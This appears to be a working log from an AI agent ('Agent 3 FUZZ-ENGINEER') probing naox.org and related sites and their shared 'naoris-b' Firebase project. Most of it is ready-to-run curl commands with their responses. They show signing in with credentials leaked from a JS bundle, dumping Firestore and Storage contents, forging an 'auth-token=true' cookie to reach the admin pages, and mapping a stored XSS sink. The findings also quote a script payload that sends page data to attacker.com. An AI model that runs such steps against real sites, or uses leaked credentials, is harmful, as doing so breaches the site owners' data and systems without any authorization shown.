# naox.org 2026-08-11 — RSC + Firebase BaaS + Storage + Sibling sharing (Agent 3)

Session: Agent 3 FUZZ-ENGINEER Web2 Deep Dive — `naox.org` / `naoris-b` Firebase
Build: `ytZg--bxWXPTuRyQUMM1N`, DPL `dpl_8FjDSyW91VkxRk3h5XXGTmEbVajU`, Next.js 14 App Router + Vercel
Creds leaked in chunk `4548-282798220a268217.js:24548`: `contact@naorisconsulting.com / <REDACTED-PASSWORD>`
Admin hardcode `<REDACTED-PASSWORD>` in `3735-*` / `app_admin_*` → `auth-token=true` cookie forge

## 1) Chunk discovery — why homepage alone is insufficient
- `index.html` alone → 21 `_next/static/chunks/*.js` refs
- Full set after 6 RSC fetches (`/`, `/admin/login`, `/admin/blogs`, `/admin`, `/blog`, `/blogs`) + webpack content grep → **35 unique hashes, 42 files on disk (2.0 MB)**
- Missing 10 initially: `3735-*,3923-*,54a60aa6-*,70e0d97a-*,8017-*`, `app/(public)/blog/[slug]/page-395b6c*`, `app/admin/blogs/create/page-4d5e0ac*`, `polyfills`, `webpack`, `pages/_error`
- Technique: `curl -sk -H "RSC: 1" https://TARGET/<route> | grep -oE 'static/chunks/[^"?\s]+\.js' | sort -u` per route; also grep downloaded chunks for `static/chunks/` refs recursively
- Build manifests: `/_next/static/<BID>/_buildManifest.js` 200 via 308, `/_ssgManifest.js` 200 (`new Set([])`), `/_appBuildManifest.js` 404 — Vercel JSON manifests server-only

## 2) Vercel DPL pinning
- Every static URL carries `?dpl=dpl_8FjDSyW91VkxRk3h5XXGTmEbVajU` extracted via `grep -oE 'dpl_[A-Za-z0-9]+' index.html`
- `curl` without `?dpl=` → 200 on `www.naox.org` but 308 `naox.org → www.naox.org`; always append `?dpl=` and verify canonical with `curl -skI` on both hosts
- `webpack-a659d7cee6f80550.js` contains `data-deployment-id="dpl_..."` trustedTypes policy

## 3) Firebase REST verification (throttle 0.4s)
```bash
# sign in
curl -sk https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=<REDACTED-FIREBASE-API-KEY> \
  -d '{"email":"contact@naorisconsulting.com","password":"<REDACTED-PASSWORD>","returnSecureToken":true}' | jq .idToken

TOKEN=<idToken>
# listCollectionIds blocked
curl -sk -X POST -H "Authorization: Bearer $TOKEN" \
  https://firestore.googleapis.com/v1/projects/naoris-b/databases/\(default\)/documents:listCollectionIds -d '{}' 
# → 403 Missing or insufficient permissions

# brute per collection — paginated
curl -sk -H "Authorization: Bearer $TOKEN" \
  "https://firestore.googleapis.com/v1/projects/naoris-b/databases/(default)/documents/blogs?pageSize=300" | jq '.documents|length'
# → 114, nextPageToken base64(last doc name); empty coll → `{}` 200 (not error)
# Storage
curl -sk -H "Authorization: Bearer $TOKEN" \
  "https://firebasestorage.googleapis.com/v0/b/naoris-b.firebasestorage.app/o?prefix=blogs/&maxResults=2" | jq
# → 2 items + nextPageToken YmxvZ3MvMjkzbS1...
# full bucket
curl -sk -H "Authorization: Bearer $TOKEN" \
  "https://firebasestorage.googleapis.com/v0/b/naoris-b.firebasestorage.app/o?prefix=" | jq '.items|length'
# → 39 (36 blogs/ + 3 orphan test/blog-title-)
```
- `blogs` only collection with data; 30 other common names (`users,admin,settings,...`) all `{}` 200 empty
- Storage prefix `blogs/{slugSanitized}/featured-{Date.now()}-{filename}` from `4548` chunk: `(0,u.KR)(l.IG,"blogs/".concat(a,"/").concat(o))`, sanitize `t.replace(/[^a-zA-Z0-9-_]/g,"")`, 5MB image/* only

## 4) Sibling Firebase sharing via HTML image URLs (no JS needed)
```bash
curl -skL https://ndigitaltrust.ma | grep -oE 'firebasestorage\.googleapis[^"]*' | head
# → 5+ hits for firebasestorage.googleapis.com%2Fv0%2Fb%2Fnaoris-b.firebasestorage.app%2Fo%2Fblogs%252F... (same bucket as naox)
# naorisconsulting.com Vite bundle → 0 hits
```
- `ndigitaltrust.ma` (DPL `dpl_5FMZxMMvUg5qmtuGHeR3MKynrwCH`) and `ndigitaltrust.com` (`dpl_BSSNWbuyeF1UPE8yRMJPghByBPGA`) share `naoris-b` bucket → cross-site poison
- `naorisconsulting.ma` → Vercel DEPLOYMENT_NOT_FOUND 404, `naorisconsulting.com` → Apache Vite no hits, `naoris.com` Cloudflare 301 no hits

## 5) Dangerous sink — stored XSS via postText (for frontend-security-audit)
- File `3923-e2eaddbd34c6f8b1.js`: `(0,a.jsx)("article",{className:"blog-content w-richtext...",dangerouslySetInnerHTML:{__html:r.postText}})`
- Source = Firestore `blogs/{id}.postText` (attacker-writable via CRUD), Sink = `e.innerHTML=t` in `4bd1b696` React runtime
- Draft doc `blogs/26OSHLirjl94yp76v37V` "Security Update - Important" already contains `<script>fetch('https://attacker.com/steal?'+new URLSearchParams({...}))</script>` + password input steal
- No server sanitization, no DOMPurify; fix = sanitize on write + `DOMPurify.sanitize(postText)` before `dangerouslySetInnerHTML` + CSP `script-src 'self'`

## 6) Admin fuzz (cookie forge)
```bash
curl -sk -D - https://www.naox.org/admin/blogs | head -n 5
# → HTTP/2 307 Location: /admin/login (no cookie)
curl -sk -D - -H "Cookie: auth-token=true" https://www.naox.org/admin/blogs | head -n 5
# → HTTP/2 200 (forged)
# brute 29 words under /admin/ → all 404 even with forge; only /admin/login,/admin/blogs,/admin/blogs/create are 200 with forge
```
- Cookie `auth-token=true` no HttpOnly/Secure/Signature, client `AuthProvider.checkAuthStatus()` only
- Route table from `3735` chunk: `LOGIN:/admin/login, LIST_BLOGS:/admin/blogs, CREATE_BLOGS:/admin/blogs/create, EDIT_BLOGS:/admin/blogs/edit` — latter needs client router state, direct GET 404 even with id

## Outputs
- `/tmp/naoris-a3-findings.json` + `/tmp/naoris-a3-report.md` (42 chunks, grep + fuzz + firebase + siblings)
- Verification: every claim `curl -sk -w %{http_code}` with throttle 0.4s, no fabricate
